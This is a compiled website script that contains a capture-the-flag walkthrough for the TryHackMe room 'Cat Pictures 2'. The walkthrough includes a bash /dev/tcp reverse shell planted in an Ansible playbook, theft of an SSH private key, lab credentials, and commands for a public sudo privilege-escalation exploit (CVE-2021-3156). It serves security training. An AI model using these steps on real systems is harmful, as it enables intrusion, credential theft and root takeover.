"use strict";(self.webpackChunk_2h3ph3rd_github_io=self.webpackChunk_2h3ph3rd_github_io||[]).push([[152],{2344:(e,n,t)=>{t.r(n),t.d(n,{assets:()=>c,contentTitle:()=>r,default:()=>d,frontMatter:()=>a,metadata:()=>l,toc:()=>h});var s=t(4848),i=t(8453);const a={},r="Cat Pictures 2",l={id:"writeups/thm/challenges/cat-pictures-2",title:"Cat Pictures 2",description:"This is a writeup for the TryHackMe room Cat Pictures 2.",source:"@site/docs/writeups/thm/challenges/cat-pictures-2.md",sourceDirName:"writeups/thm/challenges",slug:"/writeups/thm/challenges/cat-pictures-2",permalink:"/docs/writeups/thm/challenges/cat-pictures-2",draft:!1,unlisted:!1,editUrl:"https://github.com/facebook/docusaurus/tree/main/packages/create-docusaurus/templates/shared/docs/writeups/thm/challenges/cat-pictures-2.md",tags:[],version:"current",frontMatter:{},sidebar:"writeupsSidebar",previous:{title:"Soccer",permalink:"/docs/writeups/htb/soccer"},next:{title:"Crylo",permalink:"/docs/writeups/thm/challenges/crylo"}},c={},h=[{value:"Footprinting",id:"footprinting",level:2},{value:"First flag",id:"first-flag",level:2},{value:"Finding interesting metadata",id:"finding-interesting-metadata",level:3},{value:"The secret note",id:"the-secret-note",level:3},{value:"Accessing Gitea",id:"accessing-gitea",level:3},{value:"Second flag",id:"second-flag",level:2},{value:"Running Ansible tasks using OliveTin",id:"running-ansible-tasks-using-olivetin",level:3},{value:"Editing the playbook",id:"editing-the-playbook",level:3},{value:"Third flag",id:"third-flag",level:2},{value:"Obtaining a reverse shell",id:"obtaining-a-reverse-shell",level:3},{value:"Stealing ssh keys",id:"stealing-ssh-keys",level:3},{value:"Exploiting CVE-2021-3156",id:"exploiting-cve-2021-3156",level:3}];function o(e){const n={a:"a",code:"code",h1:"h1",h2:"h2",h3:"h3",li:"li",p:"p",pre:"pre",ul:"ul",...(0,i.R)(),...e.components},{Gist:t,Image:a}=n;return t||p("Gist",!0),a||p("Image",!0),(0,s.jsxs)(s.Fragment,{children:[(0,s.jsx)(n.h1,{id:"cat-pictures-2",children:"Cat Pictures 2"}),"\n",(0,s.jsxs)(n.p,{children:["This is a writeup for the TryHackMe room ",(0,s.jsx)(n.a,{href:"https://tryhackme.com/room/catpictures2",children:"Cat Pictures 2"}),"."]}),"\n",(0,s.jsx)(a,{src:"https://tryhackme-images.s3.amazonaws.com/room-icons/4c424fa649d64938ae8282b14e4299ac.png",width:"128"}),"\n",(0,s.jsx)(n.p,{children:"Main parts of the room:"}),"\n",(0,s.jsxs)(n.ul,{children:["\n",(0,s.jsx)(n.li,{children:"Reading image metadata"}),"\n",(0,s.jsx)(n.li,{children:"Accessing Gitea and editing files using Git or in-browser editor"}),"\n",(0,s.jsx)(n.li,{children:"Runnig custom Ansible tasks through OliveTin"}),"\n",(0,s.jsx)(n.li,{children:"Exploiting CVE-2021-3156"}),"\n"]}),"\n",(0,s.jsx)(n.h2,{id:"footprinting",children:"Footprinting"}),"\n",(0,s.jsx)(n.p,{children:"Firstly, we can start with a nmap scan."}),"\n",(0,s.jsx)(n.p,{children:"We find five open ports with three web servers publicly accessible."}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"nmap -sS <HOST>\n"})}),"\n",(0,s.jsx)(a,{src:"/images/writeups/thm/challenges/cat-pictures-2/nmap.png"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{children:"22 -> SSH\n80 -> Lychee Photo Album\n222 -> Gitea SSH (?)\n3000 -> Gitea\n8080 -> python server (?)\n"})}),"\n",(0,s.jsx)(n.h2,{id:"first-flag",children:"First flag"}),"\n",(0,s.jsx)(n.h3,{id:"finding-interesting-metadata",children:"Finding interesting metadata"}),"\n",(0,s.jsx)(n.p,{children:"We can begin by looking inside the Lychee Photo Album."}),"\n",(0,s.jsx)(n.p,{children:"In the info of the first image we can find a message about stripping away the metadata."}),"\n",(0,s.jsx)(a,{src:"/images/writeups/thm/challenges/cat-pictures-2/image.png"}),"\n",(0,s.jsx)(n.p,{children:"Once the image is downloaded, we can check its metadata to find an url to a secret txt note."}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{children:"exiftool image.jpg\n"})}),"\n",(0,s.jsx)(a,{src:"/images/writeups/thm/challenges/cat-pictures-2/metadata.png"}),"\n",(0,s.jsx)(n.h3,{id:"the-secret-note",children:"The secret note"}),"\n",(0,s.jsxs)(n.p,{children:["The url is ",(0,s.jsx)(n.code,{children:":8080/764efa883dda1e11db47671c4a3bbd9e.txt"})]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{children:"note to self:\n\nI setup an internal gitea instance to start using IaC for this server. It's at a quite basic state, but I'm putting the password here because I will definitely forget.\nThis file isn't easy to find anyway unless you have the correct url...\n\ngitea: port 3000\nuser: samarium\npassword: TUmhyZ37CLZrhP\n\nansible runner (olivetin): port 1337\n"})}),"\n",(0,s.jsx)(n.h3,{id:"accessing-gitea",children:"Accessing Gitea"}),"\n",(0,s.jsx)(n.p,{children:"Now, we have the credentials for the Gitea instance."}),"\n",(0,s.jsxs)(n.p,{children:["Once logged in, we can see a repository called ",(0,s.jsx)(n.code,{children:"ansible"}),"."]}),"\n",(0,s.jsx)(a,{src:"/images/writeups/thm/challenges/cat-pictures-2/repo.png"}),"\n",(0,s.jsxs)(n.p,{children:["Inside the repository there is a file called ",(0,s.jsx)(n.code,{children:"flag1.txt"}),". Open it to get the first flag."]}),"\n",(0,s.jsx)(n.h2,{id:"second-flag",children:"Second flag"}),"\n",(0,s.jsx)(n.h3,{id:"running-ansible-tasks-using-olivetin",children:"Running Ansible tasks using OliveTin"}),"\n",(0,s.jsx)(n.p,{children:"From the secret note, we know that Ansible is accessible on the port 1337."}),"\n",(0,s.jsx)(n.p,{children:"There we can find a OliveTin instance that allows to run the Ansible tasks."}),"\n",(0,s.jsx)(a,{src:"/images/writeups/thm/challenges/cat-pictures-2/ansible.png"}),"\n",(0,s.jsx)(n.h3,{id:"editing-the-playbook",children:"Editing the playbook"}),"\n",(0,s.jsxs)(n.p,{children:["It is possible to change the script ",(0,s.jsx)(n.code,{children:"playbook.yml"})," through Gitea and then run it from OliveTin."]}),"\n",(0,s.jsx)(n.p,{children:"If you prefer you can also configure the ssh access and modify it from your machine."}),"\n",(0,s.jsx)(a,{src:"/images/writeups/thm/challenges/cat-pictures-2/edit.png"}),"\n",(0,s.jsx)(n.p,{children:"Firstly, we can print the content of the home folder."}),"\n",(0,s.jsx)(n.p,{children:"Following the example script, this is a possible solution."}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-yaml",children:"---\n- name: Test\n  hosts: all\n  remote_user: bismuth\n  tasks:\n    - name: print home folder\n      become: false\n      command: ls -lR ~\n      register: ls_content\n      changed_when: false\n\n    - debug: var=ls_content\n"})}),"\n",(0,s.jsx)(n.p,{children:"Run the script and check the output."}),"\n",(0,s.jsxs)(n.p,{children:["We can see that in the home folder there is a file called ",(0,s.jsx)(n.code,{children:"flag2.txt"}),"."]}),"\n",(0,s.jsx)(n.p,{children:"We can edit again the script to print the content of the flag."}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-yaml",children:"---\n- name: Test\n  hosts: all\n  remote_user: bismuth\n  tasks:\n    - name: print flag2\n      become: false\n      command: cat flag2.txt\n      register: flag2\n      changed_when: false\n\n    - debug: var=flag2\n"})}),"\n",(0,s.jsx)(a,{src:"/images/writeups/thm/challenges/cat-pictures-2/ansible-output.png"}),"\n",(0,s.jsx)(n.p,{children:"If you check the output, you can see the second flag."}),"\n",(0,s.jsx)(n.h2,{id:"third-flag",children:"Third flag"}),"\n",(0,s.jsx)(n.h3,{id:"obtaining-a-reverse-shell",children:"Obtaining a reverse shell"}),"\n",(0,s.jsx)(n.p,{children:"For the third flag, it is better to use a reverse shell."}),"\n",(0,s.jsx)(n.p,{children:"Remember to listen with:"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"nc -nlvp <PORT>\n"})}),"\n",(0,s.jsx)(n.p,{children:"To check your IP use:"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"ifconfig\n"})}),"\n",(0,s.jsx)(n.p,{children:"In this Gist you can find an example:"}),"\n",(0,s.jsx)(t,{id:"32ccf1baaa3066654a460265fca53960"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-yaml",children:"---\n- name: Test\n  hosts: all\n  remote_user: bismuth\n  tasks:\n    - name: rev\n      shell: bash -c 'bash -i >& /dev/tcp/<HOST>/<PORT> 0>&1'\n"})}),"\n",(0,s.jsx)(a,{src:"/images/writeups/thm/challenges/cat-pictures-2/rev.png"}),"\n",(0,s.jsx)(n.h3,{id:"stealing-ssh-keys",children:"Stealing ssh keys"}),"\n",(0,s.jsx)(n.p,{children:"To make the work easier, we can also steal the ssh key."}),"\n",(0,s.jsxs)(n.p,{children:["It is enough to copy the content of ",(0,s.jsx)(n.code,{children:"~/.ssh/id_rsa"})," and paste it in a file on our machine."]}),"\n",(0,s.jsxs)(n.p,{children:["Then, we can use the command ",(0,s.jsx)(n.code,{children:"ssh -i <FILE> bismuth@<HOST>"})," to login."]}),"\n",(0,s.jsx)(n.h3,{id:"exploiting-cve-2021-3156",children:"Exploiting CVE-2021-3156"}),"\n",(0,s.jsx)(n.p,{children:"We can try with LinPeas and LinEnum, but a faster way is to exploit the CVE-2021-3156 vulnerability."}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.a,{href:"https://github.com/blasty/CVE-2021-3156",children:"https://github.com/blasty/CVE-2021-3156"})}),"\n",(0,s.jsx)(n.p,{children:"Download the file from the github repo and copy them on the machine."}),"\n",(0,s.jsx)(n.p,{children:"After that, follow the instructions to exploit the vulnerability."}),"\n",(0,s.jsx)(n.p,{children:"In the end, you should run something like this:"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"# build the exploit\nmake\n\n# obtain a list of possible targets\n./sudo-hax-me-a-sandwich\n\n# select a target\n./sudo-hax-me-a-sandwich 0\n"})}),"\n",(0,s.jsx)(n.p,{children:"The third flag is in the root folder."}),"\n",(0,s.jsx)(a,{src:"/images/writeups/thm/challenges/cat-pictures-2/pe.png"})]})}function d(e={}){const{wrapper:n}={...(0,i.R)(),...e.components};return n?(0,s.jsx)(n,{...e,children:(0,s.jsx)(o,{...e})}):o(e)}function p(e,n){throw new Error("Expected "+(n?"component":"object")+" `"+e+"` to be defined: you likely forgot to import, pass, or provide it.")}},8453:(e,n,t)=>{t.d(n,{R:()=>r,x:()=>l});var s=t(6540);const i={},a=s.createContext(i);function r(e){const n=s.useContext(a);return s.useMemo((function(){return"function"==typeof e?e(n):{...n,...e}}),[n,e])}function l(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(i):e.components||i:r(e.components),s.createElement(a.Provider,{value:n},e.children)}}}]);